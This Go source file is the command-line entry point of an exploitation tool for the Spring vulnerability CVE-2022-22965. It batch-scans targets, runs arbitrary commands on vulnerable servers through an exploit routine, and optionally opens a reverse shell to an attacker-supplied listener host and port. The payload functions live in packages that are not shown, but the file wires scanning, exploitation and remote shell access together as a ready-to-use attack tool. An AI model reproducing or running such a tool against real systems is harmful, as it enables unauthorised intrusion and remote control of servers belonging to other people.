package main

import (
	"CVE-2022-22965/common"
	"CVE-2022-22965/util"
	"flag"
	"fmt"
	"os"
	"strings"
	"time"
)

/**
 * @Author Lockly
 * @Description //TODO
 * @Date 0:52 2023/6/4
 * @return
 **/

func main() {
	var (
		cmd     string
		u       string
		host    string
		port    int
		workers int
		timeout int64
		reverse bool
		pocOnly = false
	)

	flag.StringVar(&cmd, "c", "ls", "命令")
	flag.StringVar(&u, "u", "http://127.0.0.1:8080", "目标[单个ip或txt文件]")
	flag.StringVar(&host, "a", "", "反弹监听地址")
	flag.IntVar(&port, "p", 0, "反弹监听端口")
	flag.IntVar(&workers, "w", 10, "工人数量")
	flag.Int64Var(&timeout, "t", 20, "超时时间")
	flag.BoolVar(&reverse, "r", false, "是否反弹shell\t(default false)")
	flag.BoolVar(&pocOnly, "poc", true, "是否只进行poc扫描\t(default true)")
	flag.Parse()

	if !pocOnly {
		if common.Poc(u) {
			util.Log.LogInfo("Poc done! target has cve-2022-22965")
			util.Log.LogInfo("Start exploting...")
			common.Exploit(u, cmd)
			if reverse != false {
				if port != 0 && len(host) != 0 {
					common.ReverseShell(u, port, host)
				} else {
					util.Log.LogError("Please provide lhost and lport")
					return
				}
			}
			return
		} else {
			util.Log.LogError("Target is not vulnable!")
			return
		}
	} else {
		if strings.Contains(u, ".txt") {
			if _, err := os.Stat(u); err == nil {
				util.Log.LogDebug("File exsit, start scan task...")
				start := time.Now()
				common.BatchScan(common.ScanTask(u), timeout, workers)
				end := time.Since(start)
				util.Log.LogDebug(fmt.Sprintf("Scan done! Spend total time: %v", end))
			} else {
				util.Log.LogError("Provided ile not exsit")
			}
		} else {
			var single []string
			single = append(single, u)
			start := time.Now()
			common.BatchScan(single, timeout, workers)
			end := time.Since(start)
			util.Log.LogDebug(fmt.Sprintf("Scan done! Spend total time: %v", end))
		}
	}
}
